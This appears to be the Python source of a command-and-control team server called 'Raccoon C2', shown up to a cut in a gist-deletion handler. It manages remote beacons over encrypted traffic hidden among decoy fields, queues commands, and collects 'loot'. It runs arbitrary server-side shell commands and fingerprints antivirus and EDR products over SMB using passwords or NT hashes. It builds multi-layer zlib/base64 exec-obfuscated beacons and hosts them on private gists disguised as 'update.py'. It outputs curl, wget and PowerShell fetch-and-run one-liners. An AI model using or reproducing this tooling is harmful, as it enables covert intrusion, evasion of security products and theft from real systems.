#!/usr/bin/env python3
"""
Raccoon C2 Team Server
Adapted from boku7/venom architecture, protocol-matched to the Raccoon beacon.
AES-256-GCM encrypted comms, catch-all routing for evasive URLs,
embedded operator GUI with TrashPandaPaws aesthetic.

Usage:
  python server.py --port 443 --ssl
  python server.py --port 8443 --key <base64-key>
  python server.py --derive-key "https://c2.example.com/api/v1/beacon:c2.example.com"
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import re
import secrets
import ssl
import subprocess
import threading
import time
import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import Flask, request, jsonify, send_file, send_from_directory, Response

logger = logging.getLogger("raccoon.c2.server")
server_log = logging.getLogger("raccoon.c2.events")
agent_log = logging.getLogger("raccoon.c2.agents")

# ── Shared constants (must match beacon.py) ──

_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]

AGENT_NAMES = [
    "bandit", "burglar", "prowler", "scavenger", "ringtail",
    "masked", "nocturnal", "sneaky", "whiskers", "dumpster",
    "shadow", "lurker", "thief", "forager", "trickster",
    "rascal", "scamp", "pirate", "raider", "ghost",
]

import random as _rng


def _decoy_fields(n: int) -> dict:
    pool = {
        "cpu_pct": lambda: round(_rng.uniform(2, 90), 1),
        "mem_mb": lambda: _rng.randint(64, 8192),
        "disk_pct": lambda: round(_rng.uniform(10, 95), 1),
        "request_count": lambda: _rng.randint(100, 99999),
        "session_count": lambda: _rng.randint(1, 5000),
        "latency_ms": lambda: _rng.randint(1, 500),
        "cache_hit_pct": lambda: round(_rng.uniform(50, 99.9), 1),
        "thread_count": lambda: _rng.randint(4, 128),
    }
    keys = _rng.sample(list(pool.keys()), min(n, len(pool)))
    return {k: pool[k]() for k in keys}


# ── Crypto (mirrors beacon._encrypt / _decrypt) ──


class ServerCrypto:
    def __init__(self, key: bytes):
        self._key = key
        self._aesgcm = AESGCM(key)

    def encrypt(self, data: dict) -> str:
        plaintext = json.dumps(data, separators=(",", ":")).encode()
        nonce = os.urandom(12)
        ct = self._aesgcm.encrypt(nonce, plaintext, None)
        return base64.b64encode(nonce + ct).decode()

    def decrypt(self, b64: str) -> dict:
        raw = base64.b64decode(b64)
        nonce, ct = raw[:12], raw[12:]
        plaintext = self._aesgcm.decrypt(nonce, ct, None)
        return json.loads(plaintext)

    def unwrap(self, body: dict) -> Optional[dict]:
        for field in _PAYLOAD_FIELDS:
            if field in body:
                try:
                    return self.decrypt(body[field])
                except Exception:
                    continue
        for v in body.values():
            if isinstance(v, str) and len(v) > 32:
                try:
                    return self.decrypt(v)
                except Exception:
                    continue
        return None

    def wrap(self, data: dict) -> dict:
        encrypted = self.encrypt(data)
        field = _rng.choice(_PAYLOAD_FIELDS)
        payload = {field: encrypted}
        payload.update(_decoy_fields(_rng.randint(3, 7)))
        return dict(sorted(payload.items()))


# ── Data store ──

agents: dict[str, dict] = {}
task_queues: dict[str, list] = {}
results: dict[str, dict] = {}
history: dict[str, list] = {}
scan_store: dict[str, list] = {}
event_log: list[dict] = []
_pending_gists: dict[str, dict] = {}
_active_c2_profile: dict = {}
_active_c2_profile_source: str = ""
_name_counter = 0


def _assign_name() -> str:
    global _name_counter
    name = AGENT_NAMES[_name_counter % len(AGENT_NAMES)]
    idx = _name_counter // len(AGENT_NAMES)
    _name_counter += 1
    return f"raccoon-{name}-{idx}" if idx > 0 else f"raccoon-{name}"


def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _setup_file_logging(data_dir: Path):
    log_dir = data_dir / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)

    fmt = logging.Formatter("%(asctime)s  %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

    srv_handler = logging.FileHandler(log_dir / "server.log", encoding="utf-8")
    srv_handler.setFormatter(fmt)
    server_log.addHandler(srv_handler)
    server_log.setLevel(logging.INFO)

    agt_handler = logging.FileHandler(log_dir / "agents.log", encoding="utf-8")
    agt_handler.setFormatter(fmt)
    agent_log.addHandler(agt_handler)
    agent_log.setLevel(logging.INFO)


def _log_event(category: str, message: str, agent_id: str = "",
               details: Optional[dict] = None):
    entry = {
        "ts": _now(),
        "cat": category,
        "msg": message,
        "agent": agent_id,
    }
    if details:
        entry["details"] = details
    event_log.append(entry)
    if len(event_log) > 5000:
        del event_log[:1000]

    if agent_id:
        agent_log.info("[%s] [%s] %s", agent_id, category, message)
    server_log.info("[%s] %s%s", category, message,
                    f" (agent={agent_id})" if agent_id else "")


def _save_state(data_dir: Path):
    state = {
        "agents": agents,
        "history": history,
        "scan_store": scan_store,
        "name_counter": _name_counter,
    }
    (data_dir / "state.json").write_text(json.dumps(state, indent=2))


def _load_state(data_dir: Path):
    global agents, history, _name_counter
    state_file = data_dir / "state.json"
    if state_file.exists():
        state = json.loads(state_file.read_text())
        agents.update(state.get("agents", {}))
        history.update(state.get("history", {}))
        scan_store.update(state.get("scan_store", {}))
        _name_counter = state.get("name_counter", 0)
        for aid in agents:
            task_queues.setdefault(aid, [])


# ── Flask app ──


def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
               server_config: Optional[dict] = None) -> Flask:
    app = Flask(__name__)
    static_dir = Path(__file__).parent / "static"
    _server_config = server_config or {}

    # ── Operator auth ──

    def check_auth():
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:] == operator_token
        return False

    def require_auth(f):
        from functools import wraps

        @wraps(f)
        def wrapper(*args, **kwargs):
            if not check_auth():
                return jsonify({"error": "unauthorized"}), 401
            return f(*args, **kwargs)

        return wrapper

    # ── Static files ──

    @app.route("/static/<path:filename>")
    def serve_static(filename):
        return send_from_directory(str(static_dir), filename)

    @app.route("/logo.png")
    def serve_logo():
        logo = Path(__file__).parent.parent.parent / "static" / "trashpanda_logo.png"
        if logo.exists():
            return send_from_directory(str(logo.parent), logo.name)
        return "", 404

    # ── Operator GUI ──

    @app.route("/")
    def index():
        return _OPERATOR_HTML.replace("{{TOKEN}}", operator_token)

    # ── Operator API ──

    @app.route("/api/agents", methods=["GET"])
    @require_auth
    def api_agents():
        agent_list = []
        now = time.time()
        for aid, info in agents.items():
            last = info.get("_last_seen_ts", 0)
            interval = info.get("interval", 300)
            if now - last < interval * 2:
                status = "online"
            elif now - last < interval * 5:
                status = "stale"
            else:
                status = "offline"
            agent_list.append({**info, "status": status})
        return jsonify(agent_list)

    @app.route("/api/agents/<agent_id>", methods=["GET"])
    @require_auth
    def api_agent_detail(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        return jsonify(agents[agent_id])

    @app.route("/api/agents/<agent_id>/task", methods=["POST"])
    @require_auth
    def api_create_task(agent_id):
        if agent_id not in agents:
            return jsonify({"error": "not found"}), 404
        data = request.json
        task = {
            "id": str(uuid.uuid4())[:8],
            "cmd": data.get("cmd", ""),
            "args": data.get("args", ""),
            "data": data.get("data", ""),
            "timeout": data.get("timeout", 300),
            "queued": _now(),
            "status": "pending",
        }
        task_queues.setdefault(agent_id, []).append(task)
        history.setdefault(agent_id, []).append({
            "task_id": task["id"],
            "cmd": task["cmd"],
            "args": task["args"],
            "timestamp": task["queued"],
            "status": "pending",
            "output": None,
        })
        _log_event("TASK", f"cmd={task['cmd']} args={task.get('args','')} "
                   f"task_id={task['id']}", agent_id=agent_id)
        return jsonify(task)

    @app.route("/api/agents/<agent_id>/history", methods=["GET"])
    @require_auth
    def api_history(agent_id):
        return jsonify(history.get(agent_id, []))

    @app.route("/api/agents/<agent_id>/scan", methods=["GET"])
    @require_auth
    def api_scan_get(agent_id):
        return jsonify(scan_store.get(agent_id, []))

    @app.route("/api/agents/<agent_id>/scan", methods=["POST"])
    @require_auth
    def api_scan_save(agent_id):
        data = request.get_json(silent=True)
        if not isinstance(data, list):
            return jsonify({"error": "expected array"}), 400
        scan_store[agent_id] = data
        _save_state(data_dir)
        return jsonify({"ok": True, "count": len(data)})

    @app.route("/api/tasks/<task_id>", methods=["GET"])
    @require_auth
    def api_task_result(task_id):
        if task_id in results:
            return jsonify(results[task_id])
        return jsonify({"status": "pending"})

    # ── Logs API ──

    @app.route("/api/logs/server", methods=["GET"])
    @require_auth
    def api_logs_server():
        limit = request.args.get("limit", 200, type=int)
        cat = request.args.get("cat", "")
        entries = event_log
        if cat:
            entries = [e for e in entries if e["cat"] == cat.upper()]
        return jsonify(entries[-limit:])

    @app.route("/api/logs/agent/<agent_id>", methods=["GET"])
    @require_auth
    def api_logs_agent(agent_id):
        limit = request.args.get("limit", 200, type=int)
        entries = [e for e in event_log if e.get("agent") == agent_id]
        return jsonify(entries[-limit:])

    # ── Server config API ──

    @app.route("/api/server/config", methods=["GET"])
    @require_auth
    def api_server_config():
        now = time.time()
        online = sum(1 for a in agents.values()
                     if now - a.get("_last_seen_ts", 0) < a.get("interval", 300) * 2)
        key_b64 = base64.b64encode(crypto._key).decode()
        return jsonify({
            "host": _server_config.get("host", "0.0.0.0"),
            "port": _server_config.get("port", 8443),
            "ssl": _server_config.get("ssl", False),
            "cert": _server_config.get("cert", ""),
            "key_type": _server_config.get("key_type", "default"),
            "enc_key": key_b64,
            "operator_token": operator_token,
            "data_dir": str(data_dir),
            "uptime": int(now - _server_config.get("start_time", now)),
            "agents_total": len(agents),
            "agents_online": online,
            "tasks_total": sum(len(h) for h in history.values()),
        })

    @app.route("/api/server/token", methods=["POST"])
    @require_auth
    def api_rotate_token():
        return jsonify({"error": "Token rotation requires server restart"}), 400

    # ── Loot API ──

    @app.route("/api/loot", methods=["GET"])
    @require_auth
    def api_loot_list():
        loot_dir = data_dir / "loot"
        items = []
        if loot_dir.exists():
            for agent_dir in sorted(loot_dir.iterdir()):
                if not agent_dir.is_dir():
                    continue
                aid = agent_dir.name
                for f in sorted(agent_dir.iterdir(), reverse=True):
                    if f.is_file():
                        items.append({
                            "agent_id": aid,
                            "filename": f.name,
                            "size": f.stat().st_size,
                            "mtime": time.strftime("%Y-%m-%d %H:%M:%S",
                                                   time.localtime(f.stat().st_mtime)),
                        })
        dl_dir = data_dir / "downloads"
        if dl_dir.exists():
            for agent_dir in sorted(dl_dir.iterdir()):
                if not agent_dir.is_dir():
                    continue
                aid = agent_dir.name
                for f in sorted(agent_dir.iterdir(), reverse=True):
                    if f.is_file():
                        items.append({
                            "agent_id": aid,
                            "filename": f.name,
                            "size": f.stat().st_size,
                            "mtime": time.strftime("%Y-%m-%d %H:%M:%S",
                                                   time.localtime(f.stat().st_mtime)),
                            "type": "download",
                        })
        return jsonify(items)

    @app.route("/api/loot/<agent_id>/<filename>", methods=["GET"])
    @require_auth
    def api_loot_download(agent_id, filename):
        for sub in ("loot", "downloads"):
            fp = data_dir / sub / agent_id / filename
            if fp.exists() and fp.is_file():
                return send_file(str(fp), as_attachment=True,
                                download_name=filename)
        return jsonify({"error": "not found"}), 404

    # ── Server-side tool execution (Impacket, NXC) ──

    server_exec_state = {"status": "idle", "output": "", "tool": ""}

    def _run_server_cmd(cmd_str, tool_name):
        server_exec_state["status"] = "running"
        server_exec_state["tool"] = tool_name
        server_exec_state["output"] = ""
        try:
            r = subprocess.run(
                cmd_str, shell=True, capture_output=True, text=True,
                timeout=300,
            )
            output = r.stdout
            if r.stderr:
                output += "\n--- STDERR ---\n" + r.stderr
            server_exec_state["output"] = output[:65536]
            server_exec_state["status"] = "ok" if r.returncode == 0 else "error"
            _log_event("TOOL", f"{tool_name} finished (exit={r.returncode})")
        except subprocess.TimeoutExpired:
            server_exec_state["output"] = "[timeout after 300s]"
            server_exec_state["status"] = "error"
        except Exception as e:
            server_exec_state["output"] = f"[error: {e}]"
            server_exec_state["status"] = "error"

    @app.route("/api/server/exec", methods=["POST"])
    @require_auth
    def api_server_exec():
        body = request.get_json(silent=True) or {}
        cmd = body.get("cmd", "")
        tool = body.get("tool", "custom")
        if not cmd:
            return jsonify({"error": "no command"}), 400
        _log_event("TOOL", f"Executing server-side: {tool} → {cmd[:120]}")
        t = threading.Thread(
            target=_run_server_cmd, args=(cmd, tool), daemon=True
        )
        t.start()
        return jsonify({"status": "started", "tool": tool})

    @app.route("/api/server/exec/result", methods=["GET"])
    @require_auth
    def api_server_exec_result():
        return jsonify(server_exec_state)

    # ── AV/EDR enumeration via SMB (based on NXC enum_av) ──

    AV_PRODUCTS = [
        {"name":"Acronis Cyber Protect","services":["AcronisActiveProtectionService"],"pipes":[]},
        {"name":"Avast / AVG","services":["AvastWscReporter","aswbIDSAgent","AVGWscReporter","avgbIDSAgent"],"pipes":["aswCallbackPipe*","avgCallbackPipe*"]},
        {"name":"Bitdefender","services":["bdredline_agent","BDAuxSrv","UPDATESRV","VSSERV","bdredline","EPRedline","EPUpdateService","EPSecurityService","EPProtectedService","EPIntegrationService"],"pipes":["etw_sensor_pipe_ppl","local\\msgbus\\bd.process.broker.pipe"]},
        {"name":"Carbon Black","services":["Parity","CbDefense","CbDefenseSensor"],"pipes":["CarbonBlack.Sensor.*"]},
        {"name":"Check Point","services":["CPDA","vsmon","CPFileAnlyz","EPClientUIService"],"pipes":[]},
        {"name":"Cortex XDR","services":["xdrhealth","cyserver"],"pipes":[]},
        {"name":"CrowdStrike Falcon","services":["CSFalconService"],"pipes":["CrowdStrike\\{*"]},
        {"name":"Cybereason","services":["CybereasonActiveProbe","CybereasonCRS","CybereasonBlocki"],"pipes":["CybereasonAPConsoleMinionHostIpc_*"]},
        {"name":"Cynet","services":["CynetLauncher"],"pipes":[]},
        {"name":"Cylance","services":["CylanceSvc"],"pipes":[]},
        {"name":"Elastic EDR","services":["Elastic Agent","ElasticEndpoint"],"pipes":["ElasticEndpointServiceComms-*","elastic-agent-system"]},
        {"name":"ESET","services":["ekm","epfw","epfwlwf","epfwwfp","EraAgentSvc","ERAAgent","efwd","ehttpsrv"],"pipes":["nod_scriptmon_pipe"]},
        {"name":"FortiClient","services":["FA_Scheduler","FCT_SecSvr"],"pipes":["FortiClient_DBLogDaemon","FC_*"]},
        {"name":"FortiEDR","services":["FortiEDR Collector Service"],"pipes":[]},
        {"name":"G DATA","services":["AVKWCtl","AVKProxy","GDScan"],"pipes":["exploitProtectionIPC"]},
        {"name":"HarfangLab EDR","services":["hurukai","Hurukai agent","HarfangLab Hurukai agent","hurukai-av","hurukai-ui"],"pipes":["hurukai-control","hurukai-servicing","hurukai-amsi"]},
        {"name":"Kaspersky","services":["kavfsslp","KAVFS","KAVFSGT","klnagent","AVP"],"pipes":["Exploit_Blocker"]},
        {"name":"Malwarebytes","services":["MBAMService","MBEndpointAgent"],"pipes":["MBLG","MBEA2_R","MBEA2_W"]},
        {"name":"Panda / WatchGuard","services":["PandaAetherAgent","PSUAService","NanoServiceMain"],"pipes":["NNS_API_IPC_SRV_ENDPOINT","PSANMSrvcPpal"]},
        {"name":"Rapid7 InsightAgent","services":["ir_agent"],"pipes":[]},
        {"name":"SentinelOne","services":["SentinelAgent","SentinelStaticEngine","LogProcessorService"],"pipes":["SentinelAgentWorkerCert.*","DFIScanner.Etw.*","DFIScanner.Inline.*"]},
        {"name":"Sophos Intercept X","services":["SntpService","Sophos Endpoint Defense Service","Sophos File Scanner Service","Sophos Health Service","Sophos Live Query","Sophos Managed Threat Response","Sophos MCS Agent","Sophos MCS Client","Sophos System Protection Service"],"pipes":["SophosUI","SophosEventStore","sophos_deviceencryption","sophoslivequery_*"]},
        {"name":"Symantec SEP","services":["SepMasterService","SepScanService","SNAC"],"pipes":[]},
        {"name":"Tanium","services":["TaniumClient","TaniumCX"],"pipes":[]},
        {"name":"Trellix / McAfee","services":["McAfee Endpoint Security Platform Service","mfemactl","mfemms","mfefire","masvc","macmnsvc","mfetp","mfewc","mfeaack"],"pipes":["TrellixEDR_Pipe_*","mfemactl_*","McAfeeAgent_Pipe_*"]},
        {"name":"Trend Micro","services":["Trend Micro Endpoint Basecamp","TMBMServer","Trend Micro Web Service Communicator","TMiACAgentSvc","CETASvc","iVPAgent","ds_agent","ds_monitor","ds_notifier"],"pipes":["IPC_XBC_XBC_AGENT_PIPE_*","OIPC_LWCS_PIPE_*"]},
        {"name":"Wazuh","services":["WazuhSvc","wazuh-agent"],"pipes":[]},
        {"name":"Windows Defender","services":["WinDefend","Sense","WdNisSvc"],"pipes":[]},
        {"name":"Windows Defender ATP","services":["Sense"],"pipes":[]},
        {"name":"WithSecure / F-Secure","services":["fsdevcon","fshoster","fsnethoster","fsulhoster","fsulnethoster","fsulprothoster","wsulavprohoster"],"pipes":["FS_CCFIPC_*"]},
        {"name":"Qualys","services":["QualysAgent"],"pipes":[]},
        {"name":"Ivanti Security","services":["STAgent$Shavlik Protect","STDispatch$Shavlik Protect"],"pipes":[]},
        {"name":"Splunk","services":["SplunkForwarder","splunkd"],"pipes":[]},
        {"name":"Sysmon","services":["Sysmon","Sysmon64"],"pipes":[]},
        {"name":"osquery","services":["osqueryd"],"pipes":[]},
    ]

    def _run_av_enum(target, username, password, domain, use_hash):
        server_exec_state["status"] = "running"
        server_exec_state["tool"] = "avenum"
        server_exec_state["output"] = ""
        try:
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5 import transport, lsat, lsad, scmr
            from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED, RPC_UNICODE_STRING
            import fnmatch as _fnmatch

            lmhash, nthash = "", ""
            if use_hash and password:
                if ":" in password:
                    lmhash, nthash = password.split(":", 1)
                else:
                    nthash = password
                password = ""

            lines = []
            lines.append(f"Target: {target}")
            lines.append(f"Auth:   {domain}\\{username}")
            lines.append("")

            smb = SMBConnection(target, target, timeout=10)
            if use_hash:
                smb.login(username, "", domain, lmhash, nthash)
            else:
                smb.login(username, password, domain)
            lines.append(f"[+] Connected to {target} (OS: {smb.getServerOS()})")
            lines.append("")

            # Method 1: LsarLookupNames (no admin needed)
            lines.append("=" * 60)
            lines.append("SERVICE DETECTION (LsarLookupNames - unprivileged)")
            lines.append("=" * 60)
            found_services = {}
            try:
                rpctransport = transport.SMBTransport(
                    target, filename="\\lsarpc", smb_connection=smb
                )
                dce = rpctransport.get_dce_rpc()
                dce.connect()
                dce.bind(lsat.MSRPC_UUID_LSAT)

                req = lsad.LsarOpenPolicy2()
                req["SystemName"] = NULL
                req["ObjectAttributes"]["RootDirectory"] = NULL
                req["ObjectAttributes"]["ObjectName"] = NULL
                req["ObjectAttributes"]["SecurityDescriptor"] = NULL
                req["ObjectAttributes"]["SecurityQualityOfService"] = NULL
                req["DesiredAccess"] = (
                    MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES
                )
                resp = dce.request(req)
                policy_handle = resp["PolicyHandle"]

                for product in AV_PRODUCTS:
                    for svc_name in product["services"]:
                        try:
                            req2 = lsat.LsarLookupNames()
                            req2["PolicyHandle"] = policy_handle
                            req2["Count"] = 1
                            name_entry = RPC_UNICODE_STRING()
                            name_entry["Data"] = f"NT Service\\{svc_name}"
                            req2["Names"].append(name_entry)
                            req2["TranslatedSids"]["Sids"] = NULL
                            req2["LookupLevel"] = (
                                lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta
                            )
                            dce.request(req2)
                            found_services.setdefault(
                                product["name"], []
                            ).append(svc_name)
                        except Exception:
                            pass
                dce.disconnect()
            except Exception as e:
                lines.append(f"[!] LsarLookupNames failed: {e}")

            if found_services:
                for prod_name, svcs in found_services.items():
                    lines.append(
                        f"  [+] {prod_name} INSTALLED "
                        f"({', '.join(svcs)})"
                    )
            else:
                lines.append("  [-] No services detected via LSA")
            lines.append("")

            # Method 2: Named pipe detection
            lines.append("=" * 60)
            lines.append("PIPE DETECTION (IPC$ enumeration)")
            lines.append("=" * 60)
            found_pipes = {}
            try:
                ipc_files = smb.listPath("IPC$", "\\*")
                pipe_names = [f.get_longname() for f in ipc_files]
                for product in AV_PRODUCTS:
                    for pipe_pattern in product["pipes"]:
                        for pn in pipe_names:
                            if _fnmatch.fnmatch(pn, pipe_pattern):
                                found_pipes.setdefault(
                                    product["name"], []
                                ).append(pn)
                                break
            except Exception as e:
                lines.append(f"[!] Pipe enumeration failed: {e}")

            if found_pipes:
                for prod_name, pipes in found_pipes.items():
                    status = "INSTALLED and RUNNING" if prod_name in found_services else "RUNNING"
                    lines.append(
                        f"  [+] {prod_name} {status} "
                        f"(pipes: {', '.join(pipes[:3])})"
                    )
            else:
                lines.append("  [-] No known pipes detected")
            lines.append("")

            # Method 3: Service Manager (needs higher privs)
            lines.append("=" * 60)
            lines.append("SERVICE MANAGER (SCM - may need admin)")
            lines.append("=" * 60)
            scm_found = {}
            try:
                rpctransport2 = transport.SMBTransport(
                    target, filename="\\svcctl", smb_connection=smb
                )
                dce2 = rpctransport2.get_dce_rpc()
                dce2.connect()
                dce2.bind(scmr.MSRPC_UUID_SCMR)
                scm_handle = scmr.hROpenSCManagerW(dce2)["lpScHandle"]

                for product in AV_PRODUCTS:
                    for svc_name in product["services"]:
                        try:
                            svc_handle = scmr.hROpenServiceW(
                                dce2, scm_handle, svc_name
                            )["lpServiceHandle"]
                            svc_status = scmr.hRQueryServiceStatus(
                                dce2, svc_handle
                            )
                            state = svc_status["lpServiceStatus"][
                                "dwCurrentState"
                            ]
                            state_str = {
                                1: "STOPPED", 2: "START_PENDING",
                                3: "STOP_PENDING", 4: "RUNNING",
                                5: "CONTINUE_PENDING", 6: "PAUSE_PENDING",
                                7: "PAUSED",
                            }.get(state, f"UNKNOWN({state})")
                            scm_found.setdefault(
                                product["name"], []
                            ).append((svc_name, state_str))
                            scmr.hRCloseServiceHandle(dce2, svc_handle)
                        except Exception:
                            pass
                scmr.hRCloseServiceHandle(dce2, scm_handle)
                dce2.disconnect()
            except Exception as e:
                lines.append(f"  [!] SCM access failed: {e}")

            if scm_found:
                for prod_name, svcs in scm_found.items():
                    for svc_name, state_str in svcs:
                        lines.append(
                            f"  [+] {prod_name}: {svc_name} → {state_str}"
                        )
            else:
                if not found_services and not found_pipes:
                    lines.append("  [-] No AV/EDR services found via SCM")
            lines.append("")

            # Summary
            all_found = set(found_services.keys()) | set(found_pipes.keys()) | set(scm_found.keys())
            lines.append("=" * 60)
            lines.append("SUMMARY")
            lines.append("=" * 60)
            if all_found:
                for prod in sorted(all_found):
                    markers = []
                    if prod in found_services:
                        markers.append("service")
                    if prod in found_pipes:
                        markers.append("pipe")
                    if prod in scm_found:
                        states = [s for _, s in scm_found[prod]]
                        markers.append(
                            "SCM:" + ",".join(set(states))
                        )
                    lines.append(
                        f"  🛡️  {prod} [{' | '.join(markers)}]"
                    )
                lines.append(f"\n  {len(all_found)} security product(s) detected on {target}")
            else:
                lines.append("  No endpoint protection detected (clean target)")

            smb.logoff()
            server_exec_state["output"] = "\n".join(lines)
            server_exec_state["status"] = "ok"
            _log_event("TOOL", f"AV enum on {target}: {len(all_found)} products found")

        except Exception as e:
            server_exec_state["output"] = f"[!] AV enumeration failed: {e}"
            server_exec_state["status"] = "error"

    @app.route("/api/server/avenum", methods=["POST"])
    @require_auth
    def api_server_avenum():
        body = request.get_json(silent=True) or {}
        target = body.get("target", "")
        username = body.get("username", "")
        password = body.get("password", "")
        domain = body.get("domain", ".")
        use_hash = body.get("use_hash", False)
        if not target:
            return jsonify({"error": "target required"}), 400
        _log_event("TOOL", f"AV enum started on {target}")
        t = threading.Thread(
            target=_run_av_enum,
            args=(target, username, password, domain, use_hash),
            daemon=True,
        )
        t.start()
        return jsonify({"status": "started", "target": target})

    # ── Beacon generator (obfuscated one-liner) ──

    @app.route("/api/server/beacon-gen", methods=["POST"])
    @require_auth
    def api_beacon_gen():
        import zlib, random as _r, string, textwrap
        body = request.get_json(silent=True) or {}
        c2_url = body.get("c2_url", "").strip()
        enc_key = body.get("enc_key", "").strip()
        interval = int(body.get("interval", 300))
        jitter = int(body.get("jitter", 20))
        layers = max(1, min(int(body.get("layers", 3)), 6))
        if not c2_url:
            return jsonify({"error": "c2_url required"}), 400
        if not enc_key:
            enc_key = base64.b64encode(crypto._key).decode()

        beacon_path = Path(__file__).parent / "beacon.py"
        if not beacon_path.exists():
            return jsonify({"error": "beacon.py not found"}), 500
        src = beacon_path.read_text(encoding="utf-8")

        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
        config_block = textwrap.dedent(f"""\
        if __name__=="__main__":
            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
            "encryption_key":"{enc_key}",
            "proxy":{{"mode":"auto","url":""}},
            "c2_profile":{_prof_json}}}}}
            b=Beacon(_cfg);b.start()
            try:
                import time
                while True: time.sleep(60)
            except KeyboardInterrupt: b.stop()
        """)

        payload = src + "\n" + config_block

        def _rand_name(n=12):
            return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))

        def _obfuscate_layer(code, layer_num):
            compressed = zlib.compress(code.encode("utf-8"), 9)
            encoded = base64.b64encode(compressed).decode()
            var_data = _rand_name()
            var_mod = _rand_name()
            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'

        deob_layers = [{"layer": 0, "label": "Original source", "size": len(payload),
                        "preview": payload[:2000]}]
        stage = payload
        for i in range(layers):
            stage = _obfuscate_layer(stage, i)
            deob_layers.append({
                "layer": i + 1,
                "label": f"Layer {i + 1}: zlib + base64 + randomized alias",
                "size": len(stage),
                "preview": stage[:2000],
            })

        oneliner_unix = f"python3 -c '{stage}'"
        oneliner_win = f'python -c "{stage}"'
        _log_event("BEACON-GEN", f"Generated obfuscated beacon ({layers} layers) for {c2_url}")

        return jsonify({
            "oneliner_unix": oneliner_unix,
            "oneliner_win": oneliner_win,
            "layers": layers,
            "c2_url": c2_url,
            "size": len(stage),
            "raw_size": len(payload),
            "deob": list(reversed(deob_layers)),
        })

    # ── Beacon gist delivery ──

    @app.route("/api/server/beacon-gist", methods=["POST"])
    @require_auth
    def api_beacon_gist():
        import zlib, random as _r, string, textwrap

        try:
            check = subprocess.run(["gh", "auth", "status"], capture_output=True, text=True, timeout=10)
            if check.returncode != 0:
                return jsonify({"error": "gh CLI not authenticated. Run 'gh auth login' first."}), 400
        except FileNotFoundError:
            return jsonify({"error": "gh CLI not found. Install from https://cli.github.com"}), 400

        body = request.get_json(silent=True) or {}
        c2_url = body.get("c2_url", "").strip()
        enc_key = body.get("enc_key", "").strip()
        interval = int(body.get("interval", 300))
        jitter = int(body.get("jitter", 20))
        layers = max(1, min(int(body.get("layers", 3)), 6))
        filename = body.get("filename", "update.py").strip() or "update.py"
        if not c2_url:
            return jsonify({"error": "c2_url required"}), 400
        if not enc_key:
            enc_key = base64.b64encode(crypto._key).decode()

        beacon_path = Path(__file__).parent / "beacon.py"
        if not beacon_path.exists():
            return jsonify({"error": "beacon.py not found"}), 500
        src = beacon_path.read_text(encoding="utf-8")

        _prof_json = json.dumps(_active_c2_profile) if _active_c2_profile else "{}"
        config_block = textwrap.dedent(f"""\
        if __name__=="__main__":
            _cfg={{"c2":{{"beacon_interval_seconds":{interval},"jitter_percent":{jitter},
            "https":{{"enabled":True,"callback_url":"{c2_url}","verify_ssl":False}},
            "dns":{{"enabled":False,"domain":"","resolver":"8.8.8.8"}},
            "encryption_key":"{enc_key}",
            "proxy":{{"mode":"auto","url":""}},
            "c2_profile":{_prof_json}}}}}
            b=Beacon(_cfg);b.start()
            try:
                import time
                while True: time.sleep(60)
            except KeyboardInterrupt: b.stop()
        """)

        payload = src + "\n" + config_block

        def _rand_name(n=12):
            return "_" + "".join(_r.choices(string.ascii_lowercase, k=n))

        def _obfuscate_layer(code):
            compressed = zlib.compress(code.encode("utf-8"), 9)
            encoded = base64.b64encode(compressed).decode()
            var_mod = _rand_name()
            return f'import base64 as {var_mod},zlib;exec(zlib.decompress({var_mod}.b64decode("{encoded}")))'

        stage = payload
        for _ in range(layers):
            stage = _obfuscate_layer(stage)

        import tempfile
        tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False, encoding="utf-8")
        tmp.write(stage)
        tmp.close()

        try:
            r = subprocess.run(
                ["gh", "gist", "create", "--public=false", "--filename", filename, tmp.name],
                capture_output=True, text=True, timeout=30,
            )
        finally:
            os.unlink(tmp.name)

        if r.returncode != 0:
            return jsonify({"error": f"gh gist create failed: {r.stderr.strip()}"}), 500

        gist_url = r.stdout.strip()
        gist_id = gist_url.rstrip("/").split("/")[-1]

        raw_url = ""
        try:
            api_r = subprocess.run(
                ["gh", "api", f"gists/{gist_id}", "--jq", f'.files["{filename}"].raw_url'],
                capture_output=True, text=True, timeout=10,
            )
            if api_r.returncode == 0 and api_r.stdout.strip():
                raw_url = api_r.stdout.strip()
        except Exception:
            pass
        if not raw_url:
            raw_url = f"{gist_url}/raw/{filename}"

        _pending_gists[gist_id] = {
            "url": gist_url,
            "raw_url": raw_url,
            "c2_url": c2_url,
            "created": _now(),
            "filename": filename,
        }

        oneliner_unix = f"curl -sL '{raw_url}'|python3"
        oneliner_win = f'powershell -c "irm \'{raw_url}\'|python"'
        oneliner_wget = f"wget -qO- '{raw_url}'|python3"

        _log_event("BEACON-GIST", f"Created gist {gist_id} for {c2_url} (auto-delete on connect)")

        return jsonify({
            "gist_id": gist_id,
            "gist_url": gist_url,
            "raw_url": raw_url,
            "filename": filename,
            "oneliner_unix": oneliner_unix,
            "oneliner_win": oneliner_win,
            "oneliner_wget": oneliner_wget,
            "layers": layers,
            "size": len(stage),
        })

    @app.route("/api/server/beacon-gist/<gist_id>", methods=["DELETE"])
    @require_auth
    def api_beacon_gist_delete(gist_id):
        try:
